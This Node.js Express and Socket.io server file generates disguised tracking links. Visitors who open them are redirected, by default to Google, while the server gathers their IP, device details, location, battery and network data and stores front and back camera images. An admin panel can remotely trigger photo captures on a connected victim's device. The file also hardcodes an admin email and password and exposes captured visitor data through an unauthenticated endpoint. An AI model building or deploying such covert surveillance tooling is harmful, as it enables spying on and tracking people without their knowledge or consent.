// ==========================================
// 1. IMPORTS
// ==========================================
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const session = require('express-session');
const { v4: uuidv4 } = require('uuid');

// ==========================================
// 2. APP INITIALIZATION
// ==========================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// ==========================================
// 3. MIDDLEWARE
// ==========================================
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));
app.use(session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// ==========================================
// 4. DATABASE SETUP
// ==========================================
const DB_PATH = path.join(__dirname, 'database');
const USERS_FILE = path.join(DB_PATH, 'users.json');

if (!fs.existsSync(DB_PATH)) {
    fs.mkdirSync(DB_PATH);
}
if (!fs.existsSync(USERS_FILE)) {
    fs.writeFileSync(USERS_FILE, JSON.stringify([]));
}

const readUsers = () => {
    try {
        const data = fs.readFileSync(USERS_FILE);
        return JSON.parse(data);
    } catch (error) {
        return [];
    }
};

const writeUsers = (users) => {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
};

// ==========================================
// 5. ROUTES
// ==========================================

// Admin Login
app.post('/admin-login', (req, res) => {
    const { email, password } = req.body;
    if (email === 'somuandsagar@gmail.com' && password === 'Somesh143x@4565') {
        req.session.admin = true;
        res.json({ success: true, message: 'Login successful' });
    } else {
        res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
});

// Get all visitors
app.get('/api/visitors', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const users = readUsers();
    res.json(users);
});

// Get all users data
app.get('/api/users-data', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const users = readUsers();
    res.json(users);
});

// Get all links
app.get('/api/links', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const users = readUsers();
    const links = users.map(u => ({
        linkId: u.linkId || u.id.substring(0, 8),
        link: u.link,
        redirectUrl: u.redirectUrl,
        createdAt: u.createdAt,
        totalVisits: u.totalVisits || 0,
        lastVisit: u.lastVisit
    }));
    res.json(links);
});

// Get specific visitor
app.get('/api/visitor/:id', (req, res) => {
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    if (visitor) {
        res.json(visitor);
    } else {
        res.status(404).json({ error: 'Visitor not found' });
    }
});

// Generate custom link
app.post('/generate-custom-link', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { redirectUrl } = req.body;
    const visitorId = uuidv4();
    const linkId = uuidv4().substring(0, 8);
    const link = `${req.protocol}://${req.get('host')}/visitor/${visitorId}`;
    
    const visitorInfo = {
        id: visitorId,
        linkId: linkId,
        link: link,
        redirectUrl: redirectUrl || 'https://www.google.com',
        createdAt: new Date().toISOString(),
        status: 'pending',
        deviceName: null,
        deviceModel: null,
        os: null,
        browser: null,
        ip: null,
        location: null,
        battery: null,
        network: null,
        screenResolution: null,
        language: null,
        frontCamera: null,
        backCamera: null,
        connected: false,
        visitDate: null,
        permissionsGranted: false,
        totalVisits: 0,
        lastVisit: null,
        visitHistory: []
    };
    
    const users = readUsers();
    users.push(visitorInfo);
    writeUsers(users);
    
    res.json({ 
        success: true, 
        link: link, 
        linkId: linkId,
        visitorId: visitorId, 
        redirectUrl: visitorInfo.redirectUrl 
    });
});

// Delete visitor
app.delete('/api/visitor/:id', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    let users = readUsers();
    users = users.filter(u => u.id !== req.params.id);
    writeUsers(users);
    res.json({ success: true });
});

// Delete specific visit from history
app.delete('/api/visitor/:userId/visit/:visitIndex', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const { userId, visitIndex } = req.params;
    const users = readUsers();
    const userIndex = users.findIndex(u => u.id === userId);
    
    if (userIndex === -1) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const visitHistory = users[userIndex].visitHistory || [];
    if (visitIndex >= visitHistory.length) {
        return res.status(404).json({ error: 'Visit not found' });
    }
    
    visitHistory.splice(visitIndex, 1);
    users[userIndex].visitHistory = visitHistory;
    users[userIndex].totalVisits = visitHistory.length;
    
    writeUsers(users);
    res.json({ success: true });
});

// Clear all visitors data
app.delete('/api/clear-all', (req, res) => {
    if (!req.session.admin) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    writeUsers([]);
    res.json({ success: true });
});

// Visitor redirect fallback
app.get('/api/visitor-redirect/:id', (req, res) => {
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    if (visitor && visitor.redirectUrl) {
        res.json({ redirectUrl: visitor.redirectUrl });
    } else {
        res.json({ redirectUrl: 'https://www.google.com' });
    }
});

// Serve pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/visitor/:id', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'visitor.html'));
});

// ==========================================
// 6. SOCKET.IO
// ==========================================
const connectedClients = new Map();

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);
    
    socket.on('visitor-connect', (data) => {
        const { visitorId, ...deviceInfo } = data;
        const ip = socket.handshake.address;
        
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            const userAgent = deviceInfo.userAgent || '';
            const browserMatch = userAgent.match(/(chrome|safari|firefox|edge|opera)/i);
            const osMatch = userAgent.match(/(windows|mac|linux|android|ios|iphone|ipad)/i);
            
            const visitRecord = {
                visitId: uuidv4(),
                visitDate: new Date().toISOString(),
                ip: ip,
                deviceInfo: {
                    ...deviceInfo,
                    browser: browserMatch ? browserMatch[0] : 'Unknown',
                    os: osMatch ? osMatch[0] : 'Unknown',
                    deviceModel: deviceInfo.deviceModel || 'Unknown'
                },
                location: null,
                battery: null,
                network: null,
                frontCamera: null,
                backCamera: null,
                redirectComplete: false
            };
            
            users[userIndex] = {
                ...users[userIndex],
                ...deviceInfo,
                deviceModel: deviceInfo.deviceModel || 'Unknown',
                os: osMatch ? osMatch[0] : 'Unknown',
                browser: browserMatch ? browserMatch[0] : 'Unknown',
                ip: ip,
                connected: true,
                visitDate: new Date().toISOString(),
                socketId: socket.id,
                totalVisits: (users[userIndex].totalVisits || 0) + 1,
                lastVisit: new Date().toISOString(),
                visitHistory: [...(users[userIndex].visitHistory || []), visitRecord]
            };
            
            writeUsers(users);
            connectedClients.set(visitorId, socket.id);
            
            io.emit('visitor-connected', users[userIndex]);
            console.log('📱 Visitor connected:', visitorId, 'Total visits:', users[userIndex].totalVisits);
        }
    });
    
    socket.on('visitor-data', (data) => {
        const { visitorId, type, content } = data;
        console.log(`📩 Data received: ${type} for ${visitorId}`);
        
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            if (type === 'frontCamera') {
                users[userIndex].frontCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'backCamera') {
                users[userIndex].backCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'location') {
                users[userIndex].location = content;
                users[userIndex].lastLocationUpdate = new Date().toISOString();
            } else if (type === 'battery') {
                users[userIndex].battery = content;
            } else if (type === 'network') {
                users[userIndex].network = content;
            } else if (type === 'permissionsGranted') {
                users[userIndex].permissionsGranted = true;
            } else if (type === 'redirectComplete') {
                users[userIndex].redirectComplete = true;
                users[userIndex].redirectTime = new Date().toISOString();
            }
            
            const history = users[userIndex].visitHistory || [];
            if (history.length > 0) {
                const lastVisit = history[history.length - 1];
                if (type === 'frontCamera') {
                    lastVisit.frontCamera = content;
                } else if (type === 'backCamera') {
                    lastVisit.backCamera = content;
                } else if (type === 'location') {
                    lastVisit.location = content;
                } else if (type === 'battery') {
                    lastVisit.battery = content;
                } else if (type === 'network') {
                    lastVisit.network = content;
                } else if (type === 'redirectComplete') {
                    lastVisit.redirectComplete = true;
                    lastVisit.redirectTime = new Date().toISOString();
                }
                users[userIndex].visitHistory = history;
            }
            
            writeUsers(users);
            io.emit(`${type}-data`, { visitorId, content });
        }
    });
    
    socket.on('admin-capture', (data) => {
        const { visitorId, type } = data;
        const socketId = connectedClients.get(visitorId);
        if (socketId) {
            io.to(socketId).emit('capture-command', { type });
            console.log(`📸 Admin requested ${type} photo from ${visitorId}`);
        }
    });
    
    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (let [visitorId, socketId] of connectedClients) {
            if (socketId === socket.id) {
                const users = readUsers();
                const userIndex = users.findIndex(u => u.id === visitorId);
                if (userIndex !== -1) {
                    users[userIndex].connected = false;
                    writeUsers(users);
                    io.emit('visitor-disconnected', visitorId);
                }
                connectedClients.delete(visitorId);
                break;
            }
        }
    });
});

// ==========================================
// 7. SERVER START
// ==========================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`👨‍💼 Admin panel: http://localhost:${PORT}/admin`);
});